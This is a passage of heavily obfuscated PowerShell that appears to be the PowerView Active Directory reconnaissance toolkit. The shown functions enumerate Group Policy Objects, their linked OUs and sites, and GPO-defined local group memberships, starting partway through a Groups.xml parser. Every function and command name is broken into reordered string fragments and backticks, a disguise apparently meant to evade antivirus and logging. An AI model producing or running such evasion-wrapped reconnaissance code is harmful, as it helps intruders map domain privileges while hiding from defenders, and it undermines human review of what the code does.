                    ${G`RoU`pSXml} | &("{2}{3}{0}{1}" -f'Memb','er','Ad','d-') ("{0}{1}{2}"-f 'Notepro','p','erty') ("{1}{0}"-f 'Name','Group') ${gR`oUPN`AME}
                    ${g`RoUp`sxMl} | &("{2}{0}{1}" -f 'd-','Member','Ad') ("{2}{3}{0}{1}" -f'er','ty','No','teprop') ("{1}{0}{2}" -f 'ro','G','upSID') ${GR`OuPs`ID}
                    ${gro`UP`sXml} | &("{2}{0}{1}"-f 'dd-','Member','A') ("{2}{0}{1}{3}"-f'p','ro','Note','perty') ("{0}{1}{2}{3}" -f'G','roupMem','berO','f') ${N`UlL}
                    ${g`Ro`Ups`xML} | &("{2}{1}{0}" -f'er','-Memb','Add') ("{3}{2}{1}{0}"-f'roperty','ep','t','No') ("{2}{3}{1}{0}"-f 's','er','G','roupMemb') ${mEMB`E`Rs}
                    ${gRoU`ps`xml}."Ps`ObJE`cT"."tYpe`Na`MeS".("{0}{1}" -f'Inser','t').Invoke(0, ("{2}{1}{4}{0}{3}{5}"-f'ie','we','Po','w.G','rV','roupsXML'))
                    ${g`ROU`psxml}
                }
            }
        }
        catch {
            &("{3}{1}{0}{2}"-f 'Ver','e-','bose','Writ') ('[Get-Grou'+'ps'+'XML] '+'Err'+'o'+'r '+'p'+'ars'+'ing '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${maP`PeDPAt`hs}."ke`ys" | &("{4}{1}{3}{0}{2}"-f 'b','o','ject','rEach-O','F') { &("{3}{1}{2}{0}{4}"-f'Conn','mot','e','Remove-Re','ection') -Path ${_} }
    }
}


function G`et`-doMAINGPO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{2}{1}" -f'h','ess','uldProc','PSS','o'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{8}{4}{6}{5}{2}{1}{9}{0}{3}" -f'gnmen','han','T','ts','laredV','rsMore','a','PSU','seDec','Assi'}, '')]
    [OutputType({"{3}{0}{1}{2}"-f 'Vi','ew.GP','O','Power'})]
    [OutputType({"{1}{2}{3}{0}{4}"-f'PO.','PowerV','iew','.G','Raw'})]
    [CmdletBinding(DEfaULtParameterSEtNAMe = {"{1}{0}" -f'e','Non'})]
    Param(
        [Parameter(positIOn = 0, vAluEFRompIpeline = ${Tr`UE}, VALUEFRompIPelInEbyPrOPertYnAMe = ${Tr`Ue})]
        [Alias({"{2}{3}{0}{1}" -f'Nam','e','Disting','uished'}, {"{3}{1}{0}{2}" -f 'am','amAccountN','e','S'}, {"{1}{0}"-f 'e','Nam'})]
        [String[]]
        ${Id`e`NTi`TY},

        [Parameter(PaRAMetErSetNAmE = "C`oMpuT`ERidEn`Ti`TY")]
        [Alias({"{2}{3}{0}{1}"-f 'rN','ame','Comput','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${CO`M`PuTer`IDent`iTy},

        [Parameter(PAramETersEtnamE = "useri`D`En`TiTy")]
        [Alias({"{0}{2}{1}" -f'User','ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${uSERIde`NT`i`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'lte','Fi','r'})]
        [String]
        ${LDa`pf`i`lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`O`PErTIES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'h','A','DSPat'})]
        [String]
        ${S`eAR`c`HBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{4}{3}"-f 'ntr','Doma','inCo','ller','o'})]
        [String]
        ${SErv`er},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{1}{0}{2}" -f 'e','OneLev','l'}, {"{1}{2}{0}" -f'e','S','ubtre'})]
        [String]
        ${sE`ARch`ScO`PE} = ("{0}{1}"-f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsuL`T`PAgES`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RvERtIME`L`imIt},

        [ValidateSet({"{0}{1}" -f 'Da','cl'}, {"{0}{1}"-f'Gro','up'}, {"{1}{0}" -f'ne','No'}, {"{0}{1}"-f 'Owne','r'}, {"{0}{1}" -f 'Sac','l'})]
        [String]
        ${sECU`RITym`AS`KS},

        [Switch]
        ${TOM`BS`ToNE},

        [Alias({"{0}{2}{1}" -f 'Retur','ne','nO'})]
        [Switch]
        ${fi`NDo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdEnT`i`AL} =  ( Item ("vaRiaB"+"l"+"e:0ds"+"Qr") ).vALuE::"E`mpTy",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`EaRcherA`RGume`N`Ts} = @{}
        if (${PsboUndp`A`Ra`m`ETERS}[("{1}{0}{2}" -f'ai','Dom','n')]) { ${SE`ARcHE`RArGu`MENTs}[("{1}{0}{2}"-f'ma','Do','in')] = ${D`O`mAiN} }
        if (${P`SbOuNdpAra`m`EteRS}[("{1}{0}{2}"-f'ro','P','perties')]) { ${s`e`Ar`CherARGuMenTs}[("{0}{2}{1}"-f 'Properti','s','e')] = ${PrOp`E`R`TIes} }
        if (${pSBou`ND`pAR`AMEte`RS}[("{2}{1}{0}"-f'chBase','ear','S')]) { ${sEar`Che`RARg`UMENTs}[("{0}{1}{2}{3}" -f 'Sea','rchB','a','se')] = ${s`eARch`BasE} }
        if (${pS`BO`UN`d`pA`RAMeTERs}[("{1}{0}"-f'rver','Se')]) { ${sEa`RCHE`R`AR`G`UmenTs}[("{0}{1}"-f 'Se','rver')] = ${SER`V`ER} }
        if (${PsBO`UNDP`Aram`E`TERS}[("{3}{2}{0}{1}" -f 'chSco','pe','r','Sea')]) { ${seaR`CHE`R`ArGUMEnts}[("{2}{1}{0}{3}"-f 'chS','ear','S','cope')] = ${sE`A`RCh`ScoPE} }
        if (${p`SBou`NdPARA`MEteRS}[("{0}{3}{1}{2}" -f'R','sul','tPageSize','e')]) { ${s`EaRC`he`RArg`UME`NTs}[("{0}{2}{1}{3}"-f'R','sultPa','e','geSize')] = ${Res`UltPAgE`S`izE} }
        if (${pSbOu`NDp`ARAMeT`e`Rs}[("{4}{0}{1}{3}{2}"-f 'rv','erTim','mit','eLi','Se')]) { ${Se`ARC`HeRAR`guMeN`TS}[("{2}{1}{0}{3}"-f 'rverT','e','S','imeLimit')] = ${SErV`e`Rt`iMeLiMit} }
        if (${p`SBoUNDP`A`Ra`METeRs}[("{1}{0}{3}{2}"-f'i','Secur','s','tyMask')]) { ${sEaRChE`Ra`RGU`men`TS}[("{2}{0}{1}" -f'ur','ityMasks','Sec')] = ${S`ec`Ur`ITYmAsks} }
        if (${Ps`B`OU`N`dParAMETeRs}[("{2}{1}{0}" -f 'one','mbst','To')]) { ${sEarCHe`RaRGUMe`N`Ts}[("{0}{1}{2}" -f'Tombs','t','one')] = ${TOMb`sTo`Ne} }
        if (${ps`BOundPARAme`T`e`RS}[("{2}{1}{0}"-f'edential','r','C')]) { ${s`E`ARchEra`RgUmEnTS}[("{2}{0}{1}" -f 'eden','tial','Cr')] = ${C`RE`DE`NtiAL} }
        ${GP`osEA`RcH`ER} = &("{3}{1}{0}{2}{5}{4}" -f 'Domai','-','nS','Get','er','earch') @SearcherArguments
    }

    PROCESS {
        if (${GpO`Sea`RcHeR}) {
            if (${p`sbouN`DP`AR`Ame`TeRS}[("{2}{1}{0}{4}{3}"-f'put','om','C','ntity','erIde')] -or ${P`sbo`U`Nd`ParameTE`RS}[("{0}{1}{2}" -f'U','serIdenti','ty')]) {
                ${gPoA`dsP`A`ThS} = @()
                if (${SeAr`CHerAr`gu`M`ents}[("{0}{2}{1}"-f 'Pro','s','pertie')]) {
                    ${oldPrO`P`ErTiEs} = ${SEArCHeR`ARgU`Me`N`Ts}[("{2}{3}{1}{0}" -f'es','erti','Pr','op')]
                }
                ${sea`RCHer`Ar`gU`MENtS}[("{0}{1}{2}" -f'Pro','perti','es')] = ("{1}{6}{4}{5}{3}{2}{0}" -f'ame','dis','n','name,dnshost','ngui','shed','ti')
                ${targ`Et`C`o`mpuTER`NAmE} = ${NU`LL}

                if (${PsbOUn`dPaRaM`eTe`Rs}[("{3}{1}{2}{0}"-f 'tity','mputer','Iden','Co')]) {
                    ${seaR`CHE`RARgUMEN`Ts}[("{1}{0}" -f'entity','Id')] = ${C`om`pu`TErIdeNTity}
                    ${C`O`MpUter} = &("{0}{1}{3}{2}" -f 'Get','-','ter','DomainCompu') @SearcherArguments -FindOne | &("{2}{3}{0}{1}"-f'Ob','ject','Sel','ect-') -First 1
                    if(-not ${co`MPUTER}) {
                        &("{0}{2}{1}{3}"-f'W','ite-Verbos','r','e') ('[Get'+'-D'+'oma'+'i'+'nGPO] '+'Com'+'puter'+' '+"'$ComputerIdentity' "+'n'+'ot '+'foun'+'d!')
                    }
                    ${O`BjE`CtDn} = ${COmpUt`Er}."d`i`StInG`UiS`H`EdNaME"
                    ${TArGET`C`OMP`UTerN`Ame} = ${cOM`Put`Er}."D`NsHOStn`AME"
                }
                else {
                    ${seArc`HE`RArg`U`mE`NTs}[("{1}{0}{2}"-f 'dent','I','ity')] = ${USeriDE`N`TITy}
                    ${U`ser} = &("{0}{3}{1}{2}"-f 'Get-Dom','n','User','ai') @SearcherArguments -FindOne | &("{1}{3}{2}{0}" -f 'ect','Sele','bj','ct-O') -First 1
                    if(-not ${u`seR}) {
                        &("{0}{2}{1}{3}"-f'Writ','os','e-Verb','e') ('[Get-D'+'o'+'main'+'GP'+'O] '+'User'+' '+"'$UserIdentity' "+'n'+'ot '+'fou'+'nd'+'!')
                    }
                    ${Ob`JEc`TDn} = ${U`SEr}."DIs`T`ingUi`sHedn`AmE"
                }

                
                ${oBJ`e`cto`US} = @()
                ${OBJEc`TO`Us} += ${oBj`ectdN}.("{0}{1}"-f'sp','lit').Invoke(',') | &("{2}{3}{0}{1}" -f'r','Each-Object','F','o') {
                    if(${_}.("{1}{0}{2}"-f'rtswi','sta','th').Invoke('OU=')) {
                        ${O`BJE`ctDN}.("{0}{2}{1}" -f 'SubS','ring','t').Invoke(${O`B`JECTdn}.("{2}{1}{0}" -f 'xOf','de','In').Invoke("$($_),"))
                    }
                }
                &("{3}{2}{4}{0}{1}"-f 'b','ose','e-V','Writ','er') ('[Ge'+'t-Dom'+'ain'+'GPO]'+' '+'ob'+'ject '+'OUs'+': '+"$ObjectOUs")

                if (${ObJEc`To`US}) {
                    
                    ${s`EARCh`e`R`ARGuME`NtS}.("{0}{1}" -f 'Rem','ove').Invoke(("{2}{1}{0}"-f 'erties','op','Pr'))
                    ${inhERITA`N`c`EdISAB`LEd} = ${fal`sE}
                    ForEach(${Ob`j`ectoU} in ${o`Bje`CTOUs}) {
                        ${seaR`CHErARG`U`m`Ents}[("{2}{1}{0}"-f'ty','enti','Id')] = ${oB`jeC`TOu}
                        ${GPo`AdS`PAthS} += &("{0}{2}{1}{3}"-f'G','mainO','et-Do','U') @SearcherArguments | &("{2}{1}{0}"-f'ch-Object','orEa','F') {
                            
                            if (${_}."gp`lINK") {
                                ${_}."gP`lI`Nk"."sPl`it"('][') | &("{2}{4}{1}{3}{0}"-f 'ject','ach-O','Fo','b','rE') {
                                    if (${_}.("{0}{3}{2}{1}" -f's','with','ts','tar').Invoke(("{1}{0}" -f 'P','LDA'))) {
                                        ${pA`Rts} = ${_}.("{0}{1}"-f 'spli','t').Invoke(';')
                                        ${Gp`ODN} = ${p`ARTS}[0]
                                        ${enfo`R`ced} = ${pa`RtS}[1]

                                        if (${INhe`RiT`A`NCedisABL`eD}) {
                                            
                                            
                                            if (${en`F`or`CEd} -eq 2) {
                                                ${gpO`DN}
                                            }
                                        }
                                        else {
                                            
                                            ${GP`odN}
                                        }
                                    }
                                }
                            }

                            
                            if (${_}."GPOPtI`oNS" -eq 1) {
                                ${iNH`eRI`T`AnC`e`DIsablEd} = ${t`Rue}
                            }
                        }
                    }
                }

                if (${t`ArGEtco`m`puT`ernaME}) {
                    
                    ${c`OMpuTeRs`I`Te} = (&("{1}{0}{3}{6}{4}{5}{2}" -f 'e','Get-N','SiteName','tCom','e','r','put') -ComputerName ${taRGE`TC`o`MPUTe`RNa`Me})."si`T`EnAME"
                    if(${cO`mPutERSI`Te} -and (${c`oM`PUterSiTe} -notlike ("{1}{0}" -f'*','Error'))) {
                        ${sEARcH`e`RArGUmEn`TS}[("{2}{0}{1}" -f 't','y','Identi')] = ${cOmP`UteRS`ITE}
                        ${G`PoadSP`AThs} += &("{1}{2}{0}{3}" -f'mai','G','et-Do','nSite') @SearcherArguments | &("{3}{2}{1}{0}"-f 'bject','O','-','ForEach') {
                            if(${_}."GPl`INk") {
                                
                                ${_}."G`PL`iNk"."S`plIT"('][') | &("{2}{1}{0}{3}"-f 'ch-O','orEa','F','bject') {
                                    if (${_}.("{2}{3}{0}{1}"-f 'rtswit','h','st','a').Invoke(("{1}{0}"-f'AP','LD'))) {
                                        ${_}.("{0}{1}" -f'spl','it').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                ${o`BjEcTDO`m`AI`NDn} = ${oBjeC`T`dn}.("{0}{2}{1}" -f'Sub','tring','S').Invoke(${O`BJECtDn}.("{2}{0}{1}" -f 'de','xOf','In').Invoke('DC='))
                ${sear`CHE`RARg`U`me`Nts}.("{2}{0}{1}" -f'v','e','Remo').Invoke(("{1}{2}{0}" -f 'ntity','Id','e'))
                ${sEa`R`ch`erArgUME`Nts}.("{0}{1}"-f'R','emove').Invoke(("{1}{2}{0}"-f's','Prope','rtie'))
                ${sea`RCh`e`RargUMEnTS}[("{0}{2}{1}"-f'L','er','DAPFilt')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${G`p`OA`DspATHS} += &("{3}{2}{0}{1}{4}" -f'o','mainObje','t-D','Ge','ct') @SearcherArguments | &("{2}{4}{3}{0}{1}" -f 'c','t','ForE','-Obje','ach') {
                    if(${_}."GP`L`INk") {
                        
                        ${_}."g`Pl`iNk"."SpL`It"('][') | &("{2}{3}{0}{1}" -f'Eac','h-Object','Fo','r') {
                            if (${_}.("{0}{1}{2}{3}" -f 'sta','rts','w','ith').Invoke(("{0}{1}" -f'L','DAP'))) {
                                ${_}.("{0}{1}"-f 'sp','lit').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{4}{1}{0}{2}{3}" -f'e-','it','Verbos','e','Wr') ('[Get-Do'+'ma'+'in'+'G'+'PO] '+'GP'+'OAdsPath'+'s'+': '+"$GPOAdsPaths")

                
                if (${ol`D`PROp`e`RtIEs}) { ${s`EARcheRar`g`Ume`N`Ts}[("{2}{0}{1}" -f'rti','es','Prope')] = ${oLDPRop`E`RTIEs} }
                else { ${Se`Ar`chERARgUme`NTs}.("{0}{1}"-f 'Re','move').Invoke(("{0}{3}{1}{2}" -f 'Prop','i','es','ert')) }
                ${sEA`RchERARgu`m`eNTs}.("{1}{0}" -f 'move','Re').Invoke(("{1}{2}{0}" -f 'ty','Ide','nti'))

                ${gpOa`dSP`AtHS} | &("{1}{0}{3}{2}"-f'-O','Where','ect','bj') {${_} -and (${_} -ne '')} | &("{2}{4}{3}{0}{1}" -f '-','Object','For','ch','Ea') {
                    
                    ${Se`ARC`HE`RARGUm`ENtS}[("{2}{1}{0}"-f 'hBase','arc','Se')] = ${_}
                    ${SeARcH`E`Ra`RGUM`eNTS}[("{3}{1}{2}{0}" -f'ter','DAPF','il','L')] = ("{0}{1}{6}{2}{7}{3}{5}{4}"-f '(objectCat','egor','=groupP','l','ontainer)','icyC','y','o')
                    &("{4}{2}{5}{3}{1}{0}"-f't','c','o','inObje','Get-D','ma') @SearcherArguments | &("{2}{1}{0}{4}{3}" -f 'c','Ea','For','ect','h-Obj') {
                        if (${PS`BoUN`dParA`me`TErs}['Raw']) {
                            ${_}."PsOB`je`ct"."TY`P`E`NaMes".("{0}{1}" -f 'I','nsert').Invoke(0, ("{5}{4}{2}{3}{1}{0}" -f '.Raw','.GPO','rVie','w','e','Pow'))
                        }
                        else {
                            ${_}."p`S`ObjeCt"."TYPen`AM`Es".("{2}{1}{0}" -f't','er','Ins').Invoke(0, ("{2}{0}{3}{1}{4}" -f'o','rV','P','we','iew.GPO'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${ID`eNt`iTyFiL`T`Er} = ''
                ${f`iLTeR} = ''
                ${iD`EN`TItY} | &("{2}{1}{0}"-f'ect','here-Obj','W') {${_}} | &("{3}{0}{1}{4}{2}" -f 'rEa','ch-Obje','t','Fo','c') {
                    ${ID`ENTiT`yIns`TANce} = ${_}.("{0}{1}{2}"-f'R','eplac','e').Invoke('(', '\28').("{1}{0}"-f'ace','Repl').Invoke(')', '\29')
                    if (${idEN`TITYInST`An`cE} -match ((("{2}{5}{0}{4}{1}{3}" -f 'x','A^CN=','LDAP','.*','R','://'))."reP`L`AcE"('xRA',[STRING][CHar]124))) {
                        ${IdeNTI`T`y`FilT`Er} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${p`sBoUndPa`RAmETe`RS}[("{0}{1}{2}"-f 'Dom','ai','n')]) -and (-not ${psbOuN`DpaR`A`mEters}[("{1}{0}{2}"-f'earchB','S','ase')])) {
                            
                            
                            ${iD`E`N`TI`TYdOmAin} = ${IDenti`TYinsT`An`CE}.("{0}{1}{2}" -f'Sub','Stri','ng').Invoke(${id`ENTI`TYinsta`NcE}.("{0}{1}"-f 'IndexO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{0}{2}"-f'rite-Ve','W','rbose') ('[Get-D'+'oma'+'inG'+'PO]'+' '+'Extrac'+'t'+'ed '+'doma'+'i'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${SEA`R`Ch`eRaRgumENTs}[("{0}{1}" -f'D','omain')] = ${I`DenTi`TydomAIn}
                            ${GPoSE`AR`ChEr} = &("{3}{0}{1}{2}"-f'e','t','-DomainSearcher','G') @SearcherArguments
                            if (-not ${GPOS`eA`Rc`heR}) {
                                &("{2}{0}{1}" -f '-W','arning','Write') ('[Get-'+'Domai'+'nG'+'PO'+'] '+'U'+'nable '+'to'+' '+'retrie'+'ve '+'d'+'o'+'main '+'sea'+'rcher '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IDe`NTItyINS`Tan`cE} -match '{.*}') {
                        ${idE`NtiTYf`il`TER} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${G`UIDbY`T`EsTr`ING} = (-Join (([Guid]${IDE`NtI`TY`I`NSTan`CE}).("{0}{2}{1}"-f 'ToBy','ay','teArr').Invoke() | &("{3}{2}{1}{0}"-f't','c','Obje','ForEach-') {${_}.("{2}{0}{1}" -f'Stri','ng','To').Invoke('X').("{1}{0}" -f't','PadLef').Invoke(2,'0')})) -Replace (("{1}{0}" -f'..)','(')),'\$1'
                            ${iDEnT`iTY`F`ILTEr} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${i`DEN`T`iTyFILteR} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${id`eNt`ItyF`iLt`Er} -and (${ID`e`NTity`FILt`eR}.("{0}{1}" -f'Tri','m').Invoke() -ne '') ) {
                    ${Fi`lter} += "(|$IdentityFilter)"
                }

                if (${P`S`Bo`UnDPArAMeTe`Rs}[("{0}{2}{1}"-f 'LD','PFilter','A')]) {
                    &("{2}{0}{1}"-f'e-Verbos','e','Writ') ('['+'Ge'+'t'+'-DomainGPO]'+' '+'U'+'si'+'ng '+'a'+'ddi'+'tional '+'LD'+'AP '+'fil'+'ter: '+"$LDAPFilter")
                    ${fIL`Ter} += "$LDAPFilter"
                }

                ${gp`os`EAr`cHER}."f`ILtER" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{2}{1}{0}"-f 'e','os','Write-Verb') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${PS`BouND`PArAME`TErS}[("{2}{1}{0}"-f 'ne','ndO','Fi')]) { ${reSul`TS} = ${GPos`ear`C`HEr}.("{1}{0}{2}" -f 'indOn','F','e').Invoke() }
                else { ${re`sU`LTS} = ${G`Po`Sea`RCHER}.("{0}{1}" -f'F','indAll').Invoke() }
                ${ReS`UlTs} | &("{1}{0}{2}{3}" -f'he','W','r','e-Object') {${_}} | &("{3}{2}{4}{1}{0}" -f 't','c','bj','ForEach-O','e') {
                    if (${psb`Oun`dPARaMEt`ErS}['Raw']) {
                        
                        ${g`Po} = ${_}
                        ${G`Po}."pSob`Je`CT"."TY`pEn`AMEs".("{0}{1}{2}"-f'I','n','sert').Invoke(0, ("{1}{5}{4}{3}{0}{2}" -f'G','Po','PO.Raw','.','View','wer'))
                    }
                    else {
                        if (${ps`BO`UN`D`paRAmETERs}[("{1}{2}{0}"-f 'rchBase','Se','a')] -and (${S`EA`Rc`hbAsE} -Match ("{0}{1}{2}" -f '^','GC','://'))) {
                            ${g`Po} = &("{1}{3}{2}{0}"-f'roperty','Convert','P','-LDAP') -Properties ${_}."PR`OPERt`ieS"
                            try {
                                ${gPO`dn} = ${G`Po}."dIStiNGu`iShed`Na`ME"
                                ${gP`O`DomAiN} = ${g`pO`dn}.("{3}{0}{2}{1}" -f'St','ng','ri','Sub').Invoke(${G`pO`dN}.("{1}{0}{2}"-f 'x','Inde','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${GpcFIl`esY`spAth} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${g`pO} | &("{3}{1}{0}{2}"-f'b','dd-Mem','er','A') ("{2}{0}{1}" -f 'oper','ty','Notepr') ("{1}{0}{2}" -f 'spa','gpcfilesy','th') ${G`Pc`F`i`lEsYspAth}
                            }
                            catch {
                                &("{2}{1}{0}" -f'-Verbose','ite','Wr') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${g`pO} = &("{1}{3}{2}{4}{0}{5}"-f 'ro','Conv','A','ert-LD','PP','perty') -Properties ${_}."ProPeR`T`iEs"
                        }
                        ${g`Po}."PsObj`E`Ct"."tYPEna`m`Es".("{1}{0}"-f'sert','In').Invoke(0, ("{0}{1}{3}{2}{4}"-f 'Po','we','GP','rView.','O'))
                    }
                    ${G`Po}
                }
                if (${R`eSUl`TS}) {
                    try { ${RESU`l`Ts}.("{0}{1}{2}" -f 'disp','o','se').Invoke() }
                    catch {
                        &("{0}{2}{1}{3}" -f'Wr','e-Verbos','it','e') ('[Get-Do'+'m'+'a'+'inGP'+'O] '+'Er'+'ror '+'dis'+'po'+'sing'+' '+'of'+' '+'the'+' '+'Re'+'sults '+'objec'+'t: '+"$_")
                    }
                }
                ${G`poSEa`RcH`ER}.("{0}{1}"-f 'di','spose').Invoke()
            }
        }
    }
}


function gE`T`-dOmA`INgpoL`OCaL`G`R`oUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f 'ShouldProces','P','s','S'}, '')]
    [OutputType({"{1}{0}{5}{4}{3}{2}"-f'ow','P','up','ro','ew.GPOG','erVi'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, ValuefROmpIpElinE = ${T`RUe}, ValueFRoMPiPelinebypropertYnAmE = ${t`RUE})]
        [Alias({"{0}{3}{1}{2}"-f 'Di','guishedNam','e','stin'}, {"{3}{0}{1}{2}" -f'n','t','Name','SamAccou'}, {"{1}{0}"-f'e','Nam'})]
        [String[]]
        ${iDen`TI`TY},

        [Switch]
        ${re`SOLVEme`MBe`RstOs`I`DS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'r','te','Fil'})]
        [String]
        ${LD`AP`Filt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSPat','h'})]
        [String]
        ${S`earCH`Ba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{2}{1}"-f'Doma','r','ntrolle','inC','o'})]
        [String]
        ${SErV`eR},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{1}"-f'OneL','evel'}, {"{1}{0}" -f 'btree','Su'})]
        [String]
        ${SEArC`hsC`ope} = ("{2}{0}{1}"-f'ubtre','e','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resultpage`Si`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`Vert`ImELI`MIt},

        [Switch]
        ${toMbs`T`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Red`eNt`ial} =  ( GeT-iTEM  vAriAbLe:0DSqR).vALUe::"Em`PtY"
    )

    BEGIN {
        ${S`EARch`ERARG`UMentS} = @{}
        if (${P`S`BoundParaMe`Te`Rs}[("{0}{1}" -f'Dom','ain')]) { ${SE`ArC`HERa`Rg`U`MeNTs}[("{0}{1}"-f 'Do','main')] = ${do`MaIN} }
        if (${ps`B`O`U`NDpaRaMeters}[("{1}{3}{0}{2}"-f'Filte','LDA','r','P')]) { ${SEa`RcH`ERar`GUMe`Nts}[("{1}{3}{0}{2}"-f 'PF','L','ilter','DA')] = ${d`OmAin} }
        if (${PS`BOUNdPar`A`me`TeRS}[("{1}{0}{2}{3}"-f'earchB','S','as','e')]) { ${Se`ArchE`RaRGUmen`TS}[("{0}{1}{2}" -f 'S','earchBa','se')] = ${s`EaRC`HbAsE} }
        if (${p`Sb`oundPARAm`eTe`Rs}[("{0}{1}" -f'Serv','er')]) { ${seAr`ch`ERaR`GuMeNts}[("{0}{1}" -f 'Serv','er')] = ${s`erVER} }
        if (${p`s`B`ounDPAR`AmET`eRS}[("{0}{3}{2}{1}"-f'S','ope','Sc','earch')]) { ${search`e`RaR`guM`en`Ts}[("{3}{1}{0}{2}" -f 'co','hS','pe','Searc')] = ${Sea`RcHsc`O`pe} }
        if (${pS`B`ou`NdParAMeterS}[("{1}{2}{3}{0}" -f'e','R','esultPage','Siz')]) { ${S`eaR`cHE`RarGumentS}[("{0}{3}{1}{2}" -f'Re','g','eSize','sultPa')] = ${R`Es`Ul`TpAGE`sizE} }
        if (${pSBOu`NDpAra`meT`Ers}[("{3}{2}{0}{1}" -f'm','it','erverTimeLi','S')]) { ${Se`AR`C`H`ERarGuMeNtS}[("{3}{2}{0}{1}" -f'ime','Limit','T','Server')] = ${SeRve`R`Tim`eliM`It} }
        if (${P`SbO`UNdpar`AME`Ters}[("{0}{1}{2}"-f 'Tomb','sto','ne')]) { ${SEA`RcheraRGu`M`E`N`TS}[("{3}{2}{1}{0}" -f'ne','sto','omb','T')] = ${TomBS`TO`Ne} }
        if (${psb`ouND`P`Ar`AmeteRs}[("{1}{0}{2}"-f'e','Cred','ntial')]) { ${SeArCHERA`R`Gum`e`Nts}[("{2}{0}{1}" -f 'eden','tial','Cr')] = ${Cr`eDenT`I`AL} }

        ${Con`VErTa`RGuM`EN`TS} = @{}
        if (${P`S`BOUN`d`parAmeTErS}[("{1}{0}" -f 'main','Do')]) { ${cOn`V`ERTArg`UMenTs}[("{0}{1}"-f 'Doma','in')] = ${dO`Ma`iN} }
        if (${P`sbOUnD`Pa`RA`me`TeRS}[("{1}{0}" -f 'r','Serve')]) { ${COn`V`ErtArGu`me`NtS}[("{2}{1}{0}" -f 'er','erv','S')] = ${s`eRveR} }
        if (${P`sB`ouNdpa`RaM`EterS}[("{0}{1}{2}" -f 'Credent','ia','l')]) { ${Con`VER`Ta`RgUMEn`Ts}[("{1}{2}{3}{0}"-f'ential','C','re','d')] = ${cr`edENT`IaL} }

        ${sP`LItOp`Ti`on} =   $o7Y::"REM`Ove`EMPtyeNT`R`iEs"
    }

    PROCESS {
        if (${psB`OUN`dpARA`m`EtE`Rs}[("{1}{0}{2}" -f 'de','I','ntity')]) { ${sEarc`H`E`Ra`R`gumeNTs}[("{0}{2}{1}" -f 'Iden','y','tit')] = ${ID`ENtItY} }

        &("{0}{2}{1}"-f'G','omainGPO','et-D') @SearcherArguments | &("{1}{3}{2}{0}"-f 't','F','rEach-Objec','o') {
            ${gPOd`i`S`p`lAYName} = ${_}."di`Sp`L`AynAME"
            ${Gpo`Na`mE} = ${_}."NA`ME"
            ${g`poPath} = ${_}."g`PCFI`lESys`pA`Th"

            ${p`ARSEa`RGs} =  @{ ("{3}{0}{2}{1}" -f 'tT','th','mplPa','Gp') = ("$GPOPath\MACHINE\Microsoft\Windows "+(('N'+'TaJ'+'TSe'+'cE'+'d'+'itaJTGptT'+'mp'+'l.in'+'f')  -rEplaCe  ([char]97+[char]74+[char]84),[char]92)) }
            if (${PsBO`U`NdPArAm`eT`eRs}[("{1}{2}{0}"-f'ial','C','redent')]) { ${p`ARse`ArGs}[("{1}{3}{2}{0}" -f 'l','Cr','a','edenti')] = ${CRE`DEn`TIAL} }

            
            ${I`NF} = &("{1}{3}{0}{2}" -f'tT','Get-','mpl','Gp') @ParseArgs

            if (${i`Nf} -and (${I`NF}."pSBa`Se"."ke`yS" -contains ("{2}{1}{3}{0}" -f 'ip','roup ','G','Membersh'))) {
                ${Me`mbErs`Hi`pS} = @{}

                
                ForEach (${ME`mb`eR`ship} in ${I`Nf}.'Group Membership'.("{1}{3}{0}{2}" -f 'tEn','G','umerator','e').Invoke()) {
